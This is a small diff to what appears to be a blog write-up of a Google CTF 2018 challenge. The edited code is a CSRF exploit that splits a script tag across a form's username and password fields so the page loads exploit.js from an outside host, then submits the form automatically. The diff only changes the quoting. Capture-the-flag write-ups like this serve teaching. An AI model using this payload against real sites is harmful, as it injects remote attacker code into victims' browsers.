@@ -259,8 +259,8 @@ form using a CSRF exploit:</p>
     &lt;script&gt;
         const form = document.querySelector("form");
         const [user, pass] = form.querySelectorAll("input");
-        user.value = "&lt;script src='https:";
-        pass.value = "blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js'&gt;&lt;\/script&gt;";
+        user.value = '&lt;script src="https:';
+        pass.value = 'blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js"&gt;&lt;\/script&gt;';
         form.submit();
     &lt;/script&gt;
 &lt;/body&gt;
